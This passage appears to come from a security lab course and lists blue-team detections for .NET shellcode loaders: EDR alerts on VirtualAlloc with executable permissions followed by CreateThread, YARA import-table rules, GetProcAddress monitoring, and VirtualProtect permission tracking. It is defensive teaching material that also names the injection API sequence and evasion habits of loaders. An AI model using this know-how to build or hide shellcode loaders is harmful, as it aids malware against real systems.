**API call monitoring.** Endpoint Detection and Response (EDR) tools hook the same Windows functions the loaders call. When a .NET process calls VirtualAlloc with PAGE_EXECUTE_READWRITE permissions, the EDR logs it. When CreateThread is called with a start address in a newly allocated memory block (not in any loaded DLL), that is a strong injection indicator.

Blue team action: configure your EDR to alert on .NET processes that call VirtualAlloc with executable permissions followed by CreateThread with a start address in that allocation. This catches basic shellcode loaders.

**Import table analysis.** Static analysis of the compiled binary's import table reveals which Windows functions it uses. The combination of VirtualAlloc, VirtualProtect, and CreateThread in a .NET binary is suspicious.

Blue team action: YARA rules can match PE import tables for suspicious API combinations. Example: a rule that fires when a binary imports both VirtualAlloc and CreateThread from kernel32.dll.

**Dynamic API resolution detection.** When a program uses GetProcAddress to find VirtualAlloc instead of importing it directly, that is a common malware technique. EDR tools can detect GetProcAddress calls that resolve to sensitive functions.

Blue team action: monitor GetProcAddress calls that resolve known injection-related function names (VirtualAlloc, VirtualProtect, CreateThread, WriteProcessMemory, CreateRemoteThread). Multiple resolutions for these functions in the same process is a high-confidence indicator.

**Memory permission tracking.** Monitoring for memory regions that change from read-write to execute permissions (via VirtualProtect) is a strong indicator of shellcode injection. Legitimate programs rarely change memory permissions to executable after writing to it.

Blue team action: enable Windows Exploit Protection settings that monitor or block unusual memory permission changes. Deploy rules that alert when a process calls VirtualProtect to add execute permissions to a memory region.

## What Comes Next

Start Document 04 (lab/materials/04_memory_fundamentals.md). It covers how Windows manages memory in detail: virtual memory, address spaces, page permissions, and the difference between local and remote memory operations. This fills in the theory behind VirtualAlloc, VirtualProtect, and WriteProcessMemory so you understand what is actually happening at the OS level when the loaders call these functions.
